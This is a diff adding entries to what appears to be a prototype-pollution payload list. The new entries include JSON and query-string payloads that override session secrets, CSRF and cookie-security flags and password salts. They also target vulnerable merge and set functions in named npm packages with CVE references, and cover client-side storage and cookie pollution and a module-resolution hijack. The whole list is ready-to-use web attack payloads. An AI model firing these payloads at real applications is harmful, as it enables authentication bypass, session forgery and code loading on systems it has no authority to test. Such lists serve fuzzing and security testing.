@@ -88,3 +88,46 @@ constructor[prototype][polluted]=true
 {"__proto__": {"allowAdmin": true}}
 {"__proto__": {"canEdit": true}}
 {"__proto__": {"bypassAuth": true}}
+
+# Property overrides reaching security-critical defaults
+{"__proto__": {"secret": "attacker-controlled"}}   # override HMAC/session signing secret
+{"__proto__": {"sessionKey": "attacker-controlled"}}
+{"__proto__": {"cookie": "admin=1"}}               # inject cookie parsed into config
+{"__proto__": {"csrf": false}}                      # disable CSRF protection
+{"__proto__": {"salt": "known-value"}}             # weaken password hashing
+{"__proto__": {"secure": false}}                   # force insecure cookie flag off
+
+# Deeper constructor climbing (constructor.constructor)
+{"constructor": {"prototype": {"constructor": {"prototype": {"polluted": true}}}}}
+{"a": {"constructor": {"prototype": {"constructor": {"prototype": {"isAdmin": true}}}}}}
+
+# qs / querystring nested DOT parse forms (vs bracket forms above)
+?__proto__.isAdmin=true
+?__proto__.secret=attacker-controlled
+?constructor.prototype.polluted=true
+
+# Additional vulnerable merge / set sinks (CVE-referenced)
+mixin-deep(target, payload)        # 'mixin-deep' < 1.3.2 (CVE-2019-10746)
+set-value(obj, '__proto__.x', 'y') # 'set-value' < 3.0.1 (CVE-2019-10747)
+dot-prop.set(obj, '__proto__.x', 'y') # 'dot-prop' < 4.2.1 / 5.1.1 (CVE-2020-8116 / CVE-2023-26136)
+object-path.set(obj, ['__proto__','x'], 'y') # 'object-path' < 0.11.5 (CVE-2020-15256)
+flat.merge(target, payload)         # 'flat' < 5.0.1 (CVE-2021-23440)
+dset(obj, '__proto__.x', 'y')       # 'dset' < 3.1.2 (CVE-2021-23352)
+deepmerge(target, payload)          # 'deepmerge' misconfig when merge prototype keys
+defu(target, payload)               # 'defu' / unflatten variants
+
+# JSON5 / relaxed JSON parsers (unquoted keys)
+{__proto__: {polluted: true}}      # JSON5 parse of unquoted object
+{constructor: {prototype: {admin: true}}}
+
+# Array-based merge pollution (set-value / dset style)
+{"__proto__": {"0": "x"}}
+{"arr": {"__proto__": {"length": 999}}}
+
+# Client-side pollution via storage / cookie reflection
+localStorage.setItem('__proto__', JSON.stringify({polluted: true}))  # reflected if parsed unsafely
+document.cookie = "__proto__=polluted"   # if cookie->object merge is unsafe
+
+# Detection: pollute a Node require / module resolution chain
+{"__proto__": {"serveStatic": "evil-module"}}
+# After send, in node: require('serveStatic') === require('evil-module')
